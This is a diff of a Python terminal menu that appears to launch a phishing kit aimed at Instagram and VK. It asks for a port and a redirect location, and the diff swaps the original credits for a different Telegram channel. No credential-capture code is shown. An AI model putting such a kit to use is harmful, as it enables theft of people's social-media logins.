@@ -1,7 +1,9 @@
 import os, sys, time
+import random
 from multiprocessing import Process
 from time import sleep
 from prettytable import PrettyTable
+
 os.system('clear')
 о = open('log.log', 'w')
 о.close()
@@ -28,7 +30,6 @@ class B:
             time.sleep(1)
             os.system("clear")
 
-
 print("""
               /|
              / |
@@ -43,17 +44,17 @@ print("""
 \033[33m     |::::|::||::|:::|::|/:/_/::>:::::|   |::||___:||::Y::|\033[0m
 \033[31m     |____|__ |__|___|  /|___  /|___  /   |__/____  >___| /\033[0m
 \033[31m             |/       |//_____/     |/            |/    |/\033[32m 3.1\033[0m
-\033[44m                        .::Termux-Lab::.                  \033[0m
-\033[44m                       | t.me/termuxlab |                 \033[0m
+\033[44m                        .::batyarimskiy::.                  \033[0m
+\033[44m                       | t.me/weaknessinject |                 \033[0m
 """)
 print("""
 [0] История KF3
 [1] Instagram
-[2] Vk
+[2] VK
 [3] Social master
-[4] Exit
+[4] Выход
 """)
-used = input("[Enter number]: ")
+used = input("Введите номер: ")
 if used == "0":
     try:
         x = PrettyTable()
@@ -75,14 +76,13 @@ elif used == '4':
     \033[33m |::::|::||::|:::|::|/:/_/::>:::::|   |::||___:||::Y::|\033[0m
     \033[31m |____|__ |__|___|  /|___  /|___  /   |__/____  >___| /\033[0m
     \033[31m         |/       |//_____/     |/            |/    |/\033[0m
-\033[44m                        .::Termux-Lab::.                  \033[0m
-\033[44m                       | t.me/termuxlab |                 \033[0m
+    \033[44m                        .::batyarimskiy::.                  \033[0m
+    \033[44m                       | t.me/weaknessinjection |                 \033[0m
 >>> Bye!
     """)
     exit()
-print("Starting...")
-ports = input("[PORT]: ")
-reloc = input("[Location]: ")
+ports = input("Порт: ")
+reloc = input("Редирект: ")
 if reloc != "":
     if used == "1":
         f = open("instagram/location.location", 'w')
